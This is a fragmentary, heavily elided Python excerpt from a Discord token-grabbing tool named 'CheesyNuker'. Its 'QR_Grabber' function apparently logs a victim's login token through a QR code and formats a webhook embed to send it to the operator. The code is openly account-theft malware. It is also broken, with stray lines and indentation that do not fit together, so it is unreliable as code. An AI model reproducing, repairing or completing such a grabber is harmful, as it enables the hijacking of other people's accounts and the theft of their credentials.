...
def QR_Grabber(Webhook):
    ...
    if sys.argv[0].endswith(".exe"):
        print(
            f"\nOpening a new CheesyNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}"
        )
        try:
    ...
    return token;
            ...
            embed = {
                ...
                "embeds": [
                    {
                        "author": {
                            "name": "Cheesy QR Code Grabber",
                            "url": "https://github.com/bananaman2020/cheesy",
                            "icon_url": "https://camo.githubusercontent.com/5a163c69a9ed57d5ae0d403e04d584a804c1e4a5683cb7393db3b5b44a0f833d/68747470733a2f2f63646e2e6b6b676d656469612e636f6d2f706f702d6361742e676966",
                        },
                        ...
                        "color": 8388736,
                        "footer": {
                            "text": "Cheesy Corp. https://github.com/bananaman2020/cheesy"
                        },
                    }
                ],
            }
